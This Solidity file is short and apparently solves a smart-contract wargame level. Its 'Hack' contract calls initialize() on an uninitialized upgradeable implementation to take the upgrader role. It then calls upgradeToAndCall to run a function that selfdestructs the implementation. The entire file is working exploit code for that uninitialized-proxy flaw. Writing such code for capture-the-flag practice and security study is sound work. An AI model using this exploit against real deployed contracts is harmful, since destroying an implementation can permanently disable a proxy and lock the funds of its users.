// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEngine {
    function upgrader() external view returns(address);
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function initialize() external;
    
}

contract Implementation {
    
}

contract Hack {
    function pwn(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}